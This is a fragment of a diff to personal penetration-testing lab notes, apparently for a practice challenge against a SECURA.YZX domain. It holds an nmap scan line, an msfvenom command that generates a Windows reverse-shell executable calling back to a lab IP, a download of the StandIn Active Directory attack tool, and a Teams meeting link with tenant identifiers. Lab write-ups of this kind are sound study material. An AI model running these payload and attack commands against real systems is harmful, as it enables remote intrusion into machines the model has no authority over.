@@ -9,6 +9,8 @@ A5B6GFs9S3demojceJUlXBjoKegdeFugQ2zbUsWwaPuvYAn2zh0uJq9gCfbOHS4midX9pupdJITEzi9O
 
 https://your-it-note.blogspot.com/2024/09/challenge-0-secura1.html
 
+nmap --top-ports 10 -sV 192.168.163.96
+
 ┌──(kali㉿kali)-[~/lab0/95]
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.214 LPORT=443 -b '\x00\x01\x0d' -f exe -o revershell.exe
 vi cmd.bat
@@ -84,6 +86,7 @@ Target node: DEFAULT DOMAIN POLICY@SECURA.YZX
 └─$ wget https://github.com/FuzzySecurity/StandIn/releases/download/v1.3/StandIn_v13_Net35_45.zip
 unzip StandIn_v13_Net35_45.zip
 
+https://teams.microsoft.com/l/meetup-join/19%3ameeting_MTVkODIwMjItOTZiMy00OWUwLThlZTYtM2NkNGQzMjA5Y2My%40thread.v2/0?context=%7b%22Tid%22%3a%22513294a0-3e20-41b2-a970-6d30bf1546fa%22%2c%22Oid%22%3a%22031e8033-4604-4cf6-a162-73be85389a62%22%7d
 
 
 
